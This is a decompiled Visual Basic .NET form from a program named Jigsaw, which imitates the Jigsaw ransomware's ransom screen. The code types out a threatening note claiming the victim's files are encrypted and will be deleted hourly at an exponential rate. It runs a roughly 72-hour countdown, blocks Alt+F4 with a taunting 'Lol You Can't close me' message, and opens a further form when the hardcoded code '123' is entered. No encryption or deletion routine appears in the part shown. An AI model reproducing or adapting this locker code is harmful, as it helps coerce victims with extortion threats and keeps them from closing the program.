Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Jigsaw.My
Imports Microsoft.VisualBasic.CompilerServices

Namespace Jigsaw
	' Token: 0x02000009 RID: 9
	<DesignerGenerated()>
	Public Partial Class Form2
		Inherits Form

		' Token: 0x06000062 RID: 98 RVA: 0x00006C10 File Offset: 0x00004E10
		Public Sub New()
			AddHandler MyBase.KeyDown, AddressOf Me.Form2_KeyDown
			AddHandler MyBase.Load, AddressOf Me.Form2_Load
			Me.hour = 71.0
			Me.minute = 59.0
			Me.second = 59.0
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000029 RID: 41
		' (get) Token: 0x06000065 RID: 101 RVA: 0x000022E2 File Offset: 0x000004E2
		' (set) Token: 0x06000066 RID: 102 RVA: 0x000022EA File Offset: 0x000004EA
		Friend Overridable Property PictureBox1 As PictureBox

		' Token: 0x1700002A RID: 42
		' (get) Token: 0x06000067 RID: 103 RVA: 0x000022F3 File Offset: 0x000004F3
		' (set) Token: 0x06000068 RID: 104 RVA: 0x000022FB File Offset: 0x000004FB
		Friend Overridable Property Label1 As Label

		' Token: 0x1700002B RID: 43
		' (get) Token: 0x06000069 RID: 105 RVA: 0x00002304 File Offset: 0x00000504
		' (set) Token: 0x0600006A RID: 106 RVA: 0x00007520 File Offset: 0x00005720
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700002C RID: 44
		' (get) Token: 0x0600006B RID: 107 RVA: 0x0000230C File Offset: 0x0000050C
		' (set) Token: 0x0600006C RID: 108 RVA: 0x00002314 File Offset: 0x00000514
		Friend Overridable Property Panel1 As Panel

		' Token: 0x1700002D RID: 45
		' (get) Token: 0x0600006D RID: 109 RVA: 0x0000231D File Offset: 0x0000051D
		' (set) Token: 0x0600006E RID: 110 RVA: 0x00002325 File Offset: 0x00000525
		Friend Overridable Property Label2 As Label

		' Token: 0x1700002E RID: 46
		' (get) Token: 0x0600006F RID: 111 RVA: 0x0000232E File Offset: 0x0000052E
		' (set) Token: 0x06000070 RID: 112 RVA: 0x00002336 File Offset: 0x00000536
		Friend Overridable Property Label4 As Label

		' Token: 0x1700002F RID: 47
		' (get) Token: 0x06000071 RID: 113 RVA: 0x0000233F File Offset: 0x0000053F
		' (set) Token: 0x06000072 RID: 114 RVA: 0x00002347 File Offset: 0x00000547
		Friend Overridable Property Label3 As Label

		' Token: 0x17000030 RID: 48
		' (get) Token: 0x06000073 RID: 115 RVA: 0x00002350 File Offset: 0x00000550
		' (set) Token: 0x06000074 RID: 116 RVA: 0x00007564 File Offset: 0x00005764
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000031 RID: 49
		' (get) Token: 0x06000075 RID: 117 RVA: 0x00002358 File Offset: 0x00000558
		' (set) Token: 0x06000076 RID: 118 RVA: 0x00002360 File Offset: 0x00000560
		Friend Overridable Property Label5 As Label

		' Token: 0x17000032 RID: 50
		' (get) Token: 0x06000077 RID: 119 RVA: 0x00002369 File Offset: 0x00000569
		' (set) Token: 0x06000078 RID: 120 RVA: 0x000075A8 File Offset: 0x000057A8
		Friend Overridable Property TextBox1 As TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim keyEventHandler As KeyEventHandler = AddressOf Me.TextBox1_KeyDown
				Dim textBox As TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.KeyDown, keyEventHandler
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.KeyDown, keyEventHandler
				End If
			End Set
		End Property

		' Token: 0x17000033 RID: 51
		' (get) Token: 0x06000079 RID: 121 RVA: 0x00002371 File Offset: 0x00000571
		' (set) Token: 0x0600007A RID: 122 RVA: 0x00002379 File Offset: 0x00000579
		Friend Overridable Property Label6 As Label

		' Token: 0x17000034 RID: 52
		' (get) Token: 0x0600007B RID: 123 RVA: 0x00002382 File Offset: 0x00000582
		' (set) Token: 0x0600007C RID: 124 RVA: 0x000075EC File Offset: 0x000057EC
		Friend Overridable Property TextBox2 As TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim keyEventHandler As KeyEventHandler = AddressOf Me.TextBox2_KeyDown
				Dim textBox As TextBox = Me._TextBox2
				If textBox IsNot Nothing Then
					RemoveHandler textBox.KeyDown, keyEventHandler
				End If
				Me._TextBox2 = value
				textBox = Me._TextBox2
				If textBox IsNot Nothing Then
					AddHandler textBox.KeyDown, keyEventHandler
				End If
			End Set
		End Property

		' Token: 0x17000035 RID: 53
		' (get) Token: 0x0600007D RID: 125 RVA: 0x0000238A File Offset: 0x0000058A
		' (set) Token: 0x0600007E RID: 126 RVA: 0x00007630 File Offset: 0x00005830
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim keyEventHandler As KeyEventHandler = AddressOf Me.Button1_KeyDown
				Dim eventHandler As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.KeyDown, keyEventHandler
					RemoveHandler button.Click, eventHandler
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.KeyDown, keyEventHandler
					AddHandler button.Click, eventHandler
				End If
			End Set
		End Property

		' Token: 0x0600007F RID: 127 RVA: 0x00007690 File Offset: 0x00005890
		Private Sub Form2_KeyDown(sender As Object, e As KeyEventArgs)
			If e.KeyData = CType(262259, Keys) Then
				MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand)
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000080 RID: 128 RVA: 0x000076C8 File Offset: 0x000058C8
		Private Sub Form2_Load(sender As Object, e As EventArgs)
			Me.Label2.Text = Conversions.ToString(Me.hour)
			Me.Label4.Text = Conversions.ToString(Me.minute)
			Me.strmsg = String.Concat(New String() { "I want to play a game with you. Let me explain the rules:", Environment.NewLine, "Your personal files are being deleted. Your photos, videos, documents, etc...", Environment.NewLine, "But, don't worry! It will only happen if you don't comply.", Environment.NewLine, "Howeever I've already encrypted your personal files, so you cannot access them.", Environment.NewLine, Environment.NewLine, "Every hour I select some of them to delete permanently,", Environment.NewLine, "therefore I won't be able to access them, either.", Environment.NewLine, "Are you familiar with the concept of exponential growth? Let me help you out.", Environment.NewLine, "It starts out slowly then increases rapidly.", Environment.NewLine, "During the first 24hour you will only lose a few files,", Environment.NewLine, "the second day a few hundred, the third day a few thousand, and so on.", Environment.NewLine, Environment.NewLine, "If you turn off your computer or try to close me, when I start next time", Environment.NewLine, "you will get 1000 files deleted as a punishment.", Environment.NewLine, "Yes you will want me to start next time, since I am the only one that is capable to ", Environment.NewLine, "decrypt your personal data for you.", Environment.NewLine, "                         Now, let's start and enjoy our little game together!" })
			Me.Timer1.Enabled = True
		End Sub

		' Token: 0x06000081 RID: 129 RVA: 0x00007830 File Offset: 0x00005A30
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim ptr As Integer = Me.i
			Me.i = ptr + 1
			Dim label As Label = Me.Label1
			Dim label2 As Label = label
			label.Text = label2.Text + Me.strmsg.Substring(Me.i - 1, 1)
			If Me.i = Me.strmsg.Length Then
				Me.Timer1.Enabled = False
				Me.Timer2.Enabled = True
				Me.Panel1.Visible = True
				Me.Label5.Visible = True
				Me.TextBox1.Visible = True
				Me.TextBox2.Visible = True
				Me.Label6.Visible = True
				Me.Button1.Visible = True
			End If
		End Sub

		' Token: 0x06000082 RID: 130 RVA: 0x000078EC File Offset: 0x00005AEC
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Me.Label2.Text = Conversions.ToString(Me.hour)
			Me.Label4.Text = Conversions.ToString(Me.minute)
			If Me.minute = 0.0 Then
				Me.hour -= 1.0
				Me.minute = 59.0
			ElseIf Me.second = 0.0 Then
				Me.minute -= 1.0
				Me.second = 59.0
			Else
				Me.second -= 1.0
			End If
		End Sub

		' Token: 0x06000083 RID: 131 RVA: 0x00007690 File Offset: 0x00005890
		Private Sub Button1_KeyDown(sender As Object, e As KeyEventArgs)
			If e.KeyData = CType(262259, Keys) Then
				MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand)
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000084 RID: 132 RVA: 0x00007690 File Offset: 0x00005890
		Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs)
			If e.KeyData = CType(262259, Keys) Then
				MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand)
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000085 RID: 133 RVA: 0x00007690 File Offset: 0x00005890
		Private Sub TextBox2_KeyDown(sender As Object, e As KeyEventArgs)
			If e.KeyData = CType(262259, Keys) Then
				MessageBox.Show("Lol You Can't close me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand)
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000086 RID: 134 RVA: 0x000079B0 File Offset: 0x00005BB0
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.TextBox2.Text, "123", False) = 0 Then
				MyProject.Forms.Form3.Show()
			End If
		End Sub

		' Token: 0x0400003F RID: 63
		Private hour As Double

		' Token: 0x04000040 RID: 64
		Private minute As Double

		' Token: 0x04000041 RID: 65
		Private second As Double

		' Token: 0x04000042 RID: 66
		Private i As Integer

		' Token: 0x04000043 RID: 67
		Private strmsg As String
	End Class
End Namespace
